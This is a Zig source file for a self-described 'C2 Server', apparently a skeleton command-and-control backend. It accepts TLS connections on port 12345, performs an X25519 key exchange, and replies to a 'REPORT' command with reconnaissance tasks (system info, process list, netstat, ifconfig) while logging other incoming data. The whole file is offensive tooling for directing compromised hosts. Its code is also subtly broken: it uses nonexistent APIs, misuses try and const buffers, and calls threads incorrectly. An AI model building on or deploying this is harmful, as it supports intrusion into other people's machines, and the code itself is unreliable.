const std = @import("std");
const net = std.net;
const tls = std.os.windows.tls;
const Thread = std.Thread;
const crypto = std.crypto;
const DhKeyPair = crypto.dh.X25519.KeyPair;

const Session = struct {
    secret_key: [32]u8,
    // Add other session-specific data as needed
};

pub fn main() void {
    const allocator = std.heap.page_allocator;
    _ = allocator;

    // Initialize SSL/TLS context
    var tls_context = try tls.initialize();
    defer tls_context.deinitialize();

    // Initialize the server
    const addr = net.Address.parseIp4("0.0.0.0", 12345) catch |err| {
        std.debug.print("Failed to parse address: {}\n", .{std.os.strerror(@intFromError(err))});
        return;
    };

    const listener = net.tcpListen(addr) catch |err| {
        std.debug.print("Failed to start listening: {}\n", .{std.os.strerror(@intFromError(err))});
        return;
    };
    defer listener.close();

    std.debug.print("C2 Server running at {}:{}", .{ addr.ip, addr.port });

    // Infinite loop to wait for connections
    while (true) {
        const client = listener.accept() catch |err| {
            std.debug.print("Failed to accept client: {}\n", .{std.os.strerror(@intFromError(err))});
            continue;
        };
        const tls_session = try tls_context.wrapClient(client);
        defer tls_session.close();

        const thread = Thread.spawn(&tls_session, handleClient) catch |err| {
            std.debug.print("Failed to spawn thread: {}\n", .{std.os.strerror(@intFromError(err))});
            tls_session.close();
            continue;
        };
        thread.detach();
    }
}

fn handleClient(tls_session: *tls.Session) void {
    defer tls_session.close();

    var session = Session{ .secret_key = undefined };

    // Establish session with Diffie-Hellman key exchange
    const dh_keypair = DhKeyPair.generate();
    try tls_session.writeAll(dh_keypair.public_key);
    var client_pubkey: [32]u8 = undefined;
    try tls_session.read(client_pubkey[0..]);
    const shared_secret = dh_keypair.secret(client_pubkey);
    session.secret_key = shared_secret;

    // Process client commands
    const command_buffer: [256]u8 = undefined;
    const command_len = tls_session.read(command_buffer[0..]) catch |err| {
        std.debug.print("Failed to read command: {}\n", .{std.os.strerror(@intFromError(err))});
        return;
    };
    const received_command = std.mem.trimRight(u8, command_buffer[0..command_len], &[_]u8{0});
    const response = processCommand(received_command);

    tls_session.writeAll(response) catch |err| {
        std.debug.print("Failed to send response: {}\n", .{std.os.strerror(@intFromError(err))});
        return;
    };
}

fn processCommand(clientCommand: []const u8) []const u8 {
    // Improved command handling can include a switch or a command lookup table.
    if (std.mem.eql(u8, clientCommand, "REPORT")) {
        return "SYSINFO;LISTPROCS;NETSTAT;IFCONFIG";
    } else {
        std.debug.print("Received data: {}", .{clientCommand});
        return "DATA RECEIVED";
    }
}
